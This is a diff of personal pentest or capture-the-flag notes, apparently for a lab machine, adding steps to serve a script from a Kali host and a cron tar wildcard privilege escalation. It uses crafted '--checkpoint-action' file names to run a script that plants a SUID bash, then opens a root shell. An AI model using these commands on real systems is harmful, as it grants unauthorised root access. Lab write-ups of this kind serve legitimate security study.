@@ -60,8 +60,29 @@ Exploit:
             python3 -m http.server <Port>
 
         Linux:    
-            wget http://<Kali IP>/<script> 
+            wget http://<Kali IP>/<Path to script> 
             curl -f cache 
 
 
-        Linenum.sh Enumeration:
+    Linenum.sh Enumeration:
+        cat the 'rwxrwxrwx' files first
+
+        In this machine we saw in /etc/crontab  a backup file tar.gz *
+
+        the '*' indicate that we can try to test Cron Wildcards Escalation privilege
+
+        we go toe the File path of the backup
+
+        home/andre/backup 
+        echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/shell.sh
+        ls
+        chmod +x shell.sh
+
+        touch /home/andre/backup/--checkpoint=1
+        touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh
+        ls -la /tmp <-- IF we don't see our file, wait a minute and check again
+
+        ls -la: now should display 'bash'
+        /tmp/bash -p
+        Now we are root !
+
